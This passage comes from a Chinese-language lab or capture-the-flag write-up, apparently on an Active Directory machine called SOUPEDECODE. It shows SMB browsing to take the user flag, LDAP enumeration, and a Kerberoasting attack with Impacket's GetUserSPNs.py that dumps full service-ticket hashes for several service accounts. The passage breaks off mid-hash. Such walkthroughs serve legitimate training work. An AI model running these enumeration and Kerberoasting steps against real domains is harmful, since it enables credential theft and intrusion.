  ybob317                             D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                DHS        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:42:50 <span class="token number">2024</span>
  Administrator                       D        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 03:56:40 <span class="token number">2024</span>
  All Users                       DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  Default                           DHR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  Default User                    DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  desktop.ini                       AHS      <span class="token number">174</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:14:03 <span class="token number">2021</span>
  Public                             DR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 01:54:32 <span class="token number">2024</span>
  ybob317                             D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> ybob317
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                 DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  3D Objects                         DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  AppData                            DH        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Application Data                DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Contacts                           DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Cookies                         DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Desktop                            DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:45:32 <span class="token number">2024</span>
  Documents                          DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Downloads                          DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Favorites                          DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Links                              DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Local Settings                  DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Music                              DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  My Documents                    DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  NetHood                         DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  NTUSER.DAT                        AHn   <span class="token number">262144</span>  Tue Jul <span class="token number">16</span> 03:28:25 <span class="token number">2024</span>
  ntuser.dat.LOG1                   AHS    <span class="token number">49152</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  ntuser.dat.LOG2                   AHS        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  NTUSER.DAT<span class="token punctuation">&#123;</span>3e6aec0f-2b8b-11ef-bb89-080027df5733<span class="token punctuation">&#125;</span>.TM.blf    AHS    <span class="token number">65536</span>  Tue Jun <span class="token number">18</span> 01:24:54 <span class="token number">2024</span>
  NTUSER.DAT<span class="token punctuation">&#123;</span>3e6aec0f-2b8b-11ef-bb89-080027df5733<span class="token punctuation">&#125;</span>.TMContainer00000000000000000001.regtrans-ms    AHS   <span class="token number">524288</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  NTUSER.DAT<span class="token punctuation">&#123;</span>3e6aec0f-2b8b-11ef-bb89-080027df5733<span class="token punctuation">&#125;</span>.TMContainer00000000000000000002.regtrans-ms    AHS   <span class="token number">524288</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  ntuser.ini                        AHS       <span class="token number">20</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Pictures                           DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Recent                          DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Saved Games                        DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Searches                           DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  SendTo                          DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Start Menu                      DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Templates                       DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Videos                             DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> Desktop
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:45:32 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  desktop.ini                       AHS      <span class="token number">282</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  user.txt                            A       <span class="token number">32</span>  Wed Jun <span class="token number">12</span> <span class="token number">19</span>:54:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span><span class="token operator">></span> get user.txt</code></pre>
<p>拿到user flag</p>
<h2 id="LDAP探测"><a href="#LDAP探测" class="headerlink" title="LDAP探测"></a>LDAP探测</h2><p>389,636,3268,3269对应LDAP服务，先用ldapsearch扫一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ldapsearch <span class="token parameter variable">-H</span> ldap://192.168.56.128 <span class="token parameter variable">-x</span> <span class="token parameter variable">-s</span> base <span class="token parameter variable">-b</span> <span class="token string">''</span> <span class="token string">"(objectClass=*)"</span> <span class="token string">"*"</span> + 
<span class="token comment"># extended LDIF</span>
<span class="token comment">#</span>
<span class="token comment"># LDAPv3</span>
<span class="token comment"># base &lt;> with scope baseObject</span>
<span class="token comment"># filter: (objectClass=*)</span>
<span class="token comment"># requesting: * + </span>
<span class="token comment">#</span>

<span class="token comment">#</span>
dn:
domainFunctionality: <span class="token number">7</span>
forestFunctionality: <span class="token number">7</span>
domainControllerFunctionality: <span class="token number">7</span>
rootDomainNamingContext: <span class="token assign-left variable">DC</span><span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
ldapServiceName: SOUPEDECODE.LOCAL:dc01<span class="token variable">$@</span>SOUPEDECODE.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: <span class="token number">3</span>
supportedLDAPVersion: <span class="token number">2</span>
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.319
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.801
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.473
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.528
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.417
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.619
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.841
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.529
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.805
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.521
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.970
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1338
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.474
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1339
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1340
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1413
supportedControl: <span class="token number">2.16</span>.840.1.113730.3.4.9
supportedControl: <span class="token number">2.16</span>.840.1.113730.3.4.10
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1504
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1852
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.802
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1907
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1948
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1974
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1341
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2026
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2064
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2065
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2066
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2090
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2205
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2204
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2206
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2211
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2239
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2255
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2256
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2309
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2330
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2354
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.800
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.1670
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.1791
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.1935
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.2080
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.2237
subschemaSubentry: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Aggregate,CN<span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>L
 OCAL
serverName: <span class="token assign-left variable">CN</span><span class="token operator">=</span>DC01,CN<span class="token operator">=</span>Servers,CN<span class="token operator">=</span>Default-First-Site-Name,CN<span class="token operator">=</span>Sites,CN<span class="token operator">=</span>Configur
 ation,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
schemaNamingContext: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">DC</span><span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">DC</span><span class="token operator">=</span>DomainDnsZones,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">DC</span><span class="token operator">=</span>ForestDnsZones,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
isSynchronized: TRUE
highestCommittedUSN: <span class="token number">53264</span>
dsServiceName: <span class="token assign-left variable">CN</span><span class="token operator">=</span>NTDS Settings,CN<span class="token operator">=</span>DC01,CN<span class="token operator">=</span>Servers,CN<span class="token operator">=</span>Default-First-Site-Name,
 <span class="token assign-left variable">CN</span><span class="token operator">=</span>Sites,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL
defaultNamingContext: <span class="token assign-left variable">DC</span><span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
currentTime: <span class="token number">20240715202250</span>.0Z
configurationNamingContext: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL

<span class="token comment"># search result</span>
search: <span class="token number">2</span>
result: <span class="token number">0</span> Success

<span class="token comment"># numResponses: 2</span>
<span class="token comment"># numEntries: 1</span></code></pre>
<p>拿到DNS主机名<code>DC01.SOUPEDECODE.LOCAL</code>以及域名<code>SOUPEDECODE.LOCAL</code>添加到hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.56.128 dc01.soupedecode.local soupedecode.local</code></pre>
<h2 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h2><p>先请求一下TGS票据</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">192.168</span>.56.128 soupedecode.local/ybob317  <span class="token parameter variable">-outputfile</span> hashes.kerberoast
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon 
----------------------  --------------  --------  --------------------------  ---------
FTP/FileServer          file_svc                  <span class="token number">2024</span>-06-18 01:32:23.726085  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
FW/ProxyServer          firewall_svc              <span class="token number">2024</span>-06-18 01:28:32.710125  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/BackupServer       backup_svc                <span class="token number">2024</span>-06-18 01:28:49.476511  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/WebServer          web_svc                   <span class="token number">2024</span>-06-18 01:29:04.569417  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTPS/MonitoringServer  monitoring_svc            <span class="token number">2024</span>-06-18 01:29:18.511871  <span class="token operator">&lt;</span>never<span class="token operator">></span>   



<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KRB_AP_ERR_SKEW<span class="token punctuation">(</span>Clock skew too great<span class="token punctuation">)</span></code></pre>
<p>靶机跟我的kali时间不一致导致的，使用ntpdata同步一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ntpdate <span class="token number">192.168</span>.56.128
<span class="token number">2024</span>-07-16 05:50:17.021809 <span class="token punctuation">(</span>+0800<span class="token punctuation">)</span> +53997.567713 +/- <span class="token number">0.000341</span> <span class="token number">192.168</span>.56.128 s1 no-leap
CLOCK: <span class="token function">time</span> stepped by <span class="token number">53997.567713</span>

 ~/Desktop                                                                      14h 59m 58s  root@kali2  05:50:17 
<span class="token operator">></span> GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">192.168</span>.56.128 soupedecode.local/ybob317:ybob317                              

/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon 
----------------------  --------------  --------  --------------------------  ---------
FTP/FileServer          file_svc                  <span class="token number">2024</span>-06-18 01:32:23.726085  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
FW/ProxyServer          firewall_svc              <span class="token number">2024</span>-06-18 01:28:32.710125  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/BackupServer       backup_svc                <span class="token number">2024</span>-06-18 01:28:49.476511  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/WebServer          web_svc                   <span class="token number">2024</span>-06-18 01:29:04.569417  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTPS/MonitoringServer  monitoring_svc            <span class="token number">2024</span>-06-18 01:29:18.511871  <span class="token operator">&lt;</span>never<span class="token operator">></span>   



<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>monitoring_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$HTTPS</span>/MonitoringServer*<span class="token variable">$f02f26591f0aef75426d7752ca0da996</span><span class="token variable">$253b76c7d9c7aa4d0047335f7829dbd2ee4511bb0979ff2a3a3d59e2c679a4d6102b7f4527ed52f86f6d67492f0f5209fe311b16735b3e88b5c55f815d78e6898429b9d56203b3e816ef65f941476a921e717ca347542000c0980f3891e16cc2c8b329efe00710d9acdcd34018daab2e079c0552925189dfccd80c525f2ee868ae5b71670da3a2b13a55281bae121099b920e3de3d012e1bc6f11e8fbd36de6ccaeec37d39daa0e3d3fdbaf8dd92ce3a5a602fc8fbeadf2802d8fb9a4939c80b64cd23765a09253496c4443427550befd9fbcf748f5b69aee3aa3c8d3fd5132f35e15b5b03b815f4b8706c46cef736b23ee371210fcf09d1151d1b5dcb025330b74264c536fd4cbb9ff8bd49e06b09a0cdce6dcc31f46098f8d7a4678b022e8568824cbdcd745ec451f27b2f1af069df984c5e1042ea2faed224da1178bbdc1d9b062e7098b63374dfc35b7af725447d740718a60185e916753d00ecec4ce2afc0a114bd3e84832e5a248c313366f0a99d80e7c54f0b89c22ac41bf323ce3adf1d42678a929ba2f7b5d99d391659a07cacf3f9b1b26b203a5d38b71fa019947e7182b6ce230110e0c356615eecafad6aa3a8cb8d4b074516fba865d9d654ad1412737bdef738fc5ddb8e52586e69db00ad4f428f54ed8a22512573be19ae237924127a5a677e74da544df6cb2117a4094edaeaa6c5fdf57fb92b651290614c7b250acc98b3d41e9a1202a55b14a22a013c1b98fdd5e9658820824e34efc96fdcb7e20a30470c7e342666b223b35a07d22c3a3c612b652824f8192b374b710833e4452043e566f361b63d2415ae6b133a50eaf18c7b8edc6be19d96eafcf281f1786b0c1f3a94b4cfbbc37e970d8f129bee6293259870cf0a98cc841c20c4da2662fea46ce37d6efca0f72f5c8dce5c7478b823d31385b932f557cdc467e063420eab0f3618f6aea3cb2b8d045f37742a24dcaebd4dc6aca935f89f144667f7403e40ee2b1a741cf3c7a0e8be8cbcd814b2181576750a5ad93c9aa46e7fde5b01e77a9c6a7fdca5b717d3b9449eab525112882f0bebcf02c0174d32d0923134978532d30257be383f16f86c869fdc6ff8fd85db379c5373ae7667c7d23e973c52d2f3a434fb4f8a2b0ae0eb3c3015391a6e5c7efaf86c906c45c2cb104bdcf886ecfc07b52020b7ac8ea5cb518543002d20319e9560af545b94838fab148eab88d0f567900677e19c2ecd888daa3f625622ff3d76289b5c970995db0223e325643a714ea5970a409d13e01026a457543d91b2ba3db6af1f3861915e71d0c0c9fbb309c71e754377842b8abaa9a65807e0c0fcad5180ff93beb2f9e8691e02ef729bbd5ffb4359731b2c30c58b1b8f2a223e790a5e4796da4ff375cb83390cb8abb55196efc8a144590ec2773da253509ed849acecccdc42cab2065d5f917e7f5548bfa94a3b45951cd12ac8b778e9d258ed9b8fe5a89f9ec916c06065806e8edcf7</span>
<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>file_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$FTP</span>/FileServer*<span class="token variable">$2d64339559980b4a517f73b22927e7fc</span><span class="token variable">$e957aa7e0636622b658e7c474b61979d6d44a5a27b37f9eecf6e70dd0461108717a9945ba8ddcedbb3cf7a00ba7fa71e9f15c9481c90bad238c6f419e43c2f517bd72acc5570d6b0fa9bddf60cb2c1156b6c1a49ada9ec8042f84f39890a12aded78dda061dd8ec0e592a8a0160d96eae6cf7240fe3e8785cb0fae30d0649eb5f492c67d199d86c3f742f0cc6335837afce19a15c40409cc8cd6ee5833c04f0674c6e3baa6e9b040bf6f38afe65e0d8d32c03493ad1e97f2b801e3ceb61483b6863acfe17c3f6b09a2973b564fcd41a82c88e0b0e37c43e8ef491d4130584db42b41e9604f08259463be8c62bb7e99fa668e511d733c36a78d567c8c67f4b35da6a8f26e870adbc04e36258c28b8fd2e04fbf2753c86bd382d917562b5fcf4afb3569ba9ea76fcea54b993f6accd84a16692e6d08e08f1a252b6ac0eb64eef1a7ae6972af61b9f9c2899acf6704c2fa90593af60352a2e4bf4f5cf12ca7f5e769dec58c91c6fbb5d1dec0d78e0ac3332332d2550717a0512abee6a31a314c1add42835b9798d5c11b728da9b44dd68dc1d40f9237623dca9553ae4fdc7d823e38f0fd4734bb6f344a38c81d841b63071b2127b5dc21f0463d0947f019152502459e73157cd2c1f69e04782ec27934a0c1ca42581c91d778f9e8609e6c18efe5895a430c3b7c3349858cd521b6fb745d1faf1a925b0c1f4d6d9ff66f66546afde1205c3d9a1fd077b3ea5ef21f349f381727d9c35a1302218360ca316350c8afdc3d84ec3ce11f092643ea33f432fb99a4bac3b9544f98e686a3dae22e580c786839f54d165bce1711a933e4c183e3adb54a4f24a14c7abb56c9f8f8e6411603e3e6a3fed6a0506473a69d47f1d17ee05acebb2eadb7dadb56f0e23d7fdb026328a6285f9b7f8c14f55de5d2b5df2e5f4f589a7b7a6dedf50f870d1685a23460dd692bed0dd58cef3f398f70fd052f5e0c8365cea36f12b105ac5dd3a0a055ed1c0c37c1ee60d6bd4c88aad2b62653ce24166bbadb151d20cc638b19fa12016e7c0eab4dc2cb9b3e257b581970c36b8ce9a2b6e80a47bc29a73e6860e04f8788cb4afb801f384b8c8fa65c21d6976417f77e235138d41e88a4093b9d1d8cbe0d3a4898834aeb7f010d3c0b50515582e9a2e5c87af0e4a2925e972a5f75f8e142037fbde86bf8a25f26fbe62b998723a858e38b542e1967ab7ca21a2320b8c1888baf521a9d8809493a19d1d689b0e0280f5e9f369ac0ab61ebbf2aea275bd4a7124079de76efc31591e0083aaf112355d22a8f582e239299de6cbe436f1490e01903e90529df4d93a19ad2442d8052c0d6d320a91c7c0149ba885e4f776a4fa86d13c3638e51bd7f58247214448bbd4bf94a19ceb8f0cf61a2770de8d4cf0c97d1a933513bc41b64fa719fe5f6db70ffd2431c94c8264a0c02fcff40941afe2dd66b6ed31f09a385ae78b23a385b72a3c44cce1b7554b4afa9d250b7a6303623efa</span>
<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>backup_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$HTTP</span>/BackupServer*<span class="token variable">$f98fabfb92fcf6aecadefd3b8a4bdc65</span><span class="token variable">$046e82f2a4cbc668bcfbd9b6e38751d3f5fd30f158cea68f2f33d8cc139181b7b3324d5ef7ec6d765a5e71d0d2ae679e44c71722d0f6ff64f1143bf34ff6a318de1d619be7e6f64bb145072035965688245d1c047bd31518815a0d6e44834b6afcd0d47e780cba63a0921f92d51e941602c3bbb337d309fe8117d55c87e3b8c48a7394a51f6c91b0d0a8d69628f9ff088f1c81ca70b34466df43702b6599918081470b8e27ca18b246d5f666b844937627f98a0d8a8b69cf029ac6e8bda11ed8185b0e4dea0e767b9a7bb841dfe6219a554183fc411207f5b29e2e7bbf305b25dad6aeee1fdf9cf48fd41b330f0f3443bd7473f01a916258a569b9fe6ee96d337cf40bbfff0539244792edd9166c9184a434831bc2adc897539856d08e314265e02931bf0369199c349ce8a6af417cbe1fd200881e5539ba9c621b6984fc82b941c239e53ba25c07a551766cb76675d8b2d04a969e39bae49d4519b336248d7bf7967e29ab801ba743c3664c261b3014e11dd408094a2705ef0a7d014d4470fa54a5685e02969e2e06af8ad030a39520aa58e54520d979782cdc61e133f175c3fc10ed7d616d3a45f2abf6b4d93db14b5b9433129ba722a488f1a43f583a5570768fc5d8fb14868000ad0e232fbf1156db042dfda291b6f95effa7753176856c65d927a71fc2f6897f57661d2e0ec8c5b97247ec44c2989fdb1a45595ba47cc98f41850bb3663cac4d30bca745d0e37724169043cada53b96c602ae760beb3191b24b2403a812b0ad5cecbe5f6831e1f1bd51f79dc42b1f6405d21533719fe0b4fe75dff16db9a35ff869c99df937e09538a91010201bfd25931c23dab6b619674329df6c37bf400d2f54f2aff13e4f124e5aec5e942aa2e51ec8ca38327c9d138827ba41e5b06a1b2960617e0dcd13b3f1564a66914e15d784c3fa0f0a2be742357ce1e7e9b833f2b03c303e435a54ccfe74940947f14666786c47d53682ca630a4b69a966182cca60ff045f887f94669fbbe97caf6d5790af6f80fc0f3c1cb661b0ae6b6533a5885824c67f609b6e53c5b4e7b8bd0ba8dba9ea1daa3a001fbf8fde441aa1c5d963f77aa1676324729a236c84f960b8d414caddb869aa5822cf24455b061d0cfa8836aa35b4888c1ff57679b7260617e163d092de052e2557c6bfd49ce20e56d6b639097d7c828fc58e322d4f0e46e25d9d466f59520d2d781f1bd2fcd75e5cf6156b885e02acc27eba15d66a534d48bc12343c7b07ccd019b31e41de7d9ca07f90da3e6d5cb15f9e76b706b9dcb602f8aabbfff621fae7ef9e423f9fe14514d4c4eeeb2d73246d7a3aebf795ef45828f7efde263b806d7c5519e665216178d4d79186ccaa91f37268cf624e86104d22e6aa209ed64b763b6e3937343f9893c0bc15bb33ca22ec00837935d33d9cb1b862540a1c7a3bfe0321d851556103e824217b9e7de2a90a21348d2a4193141844fca7e9bfaeeec5477d2e</span>
<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>firewall_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$FW</span>/ProxyServer*<span class="token variable">$ad4bb3d6193648b48dfe968dfbce59da</span><span class="token 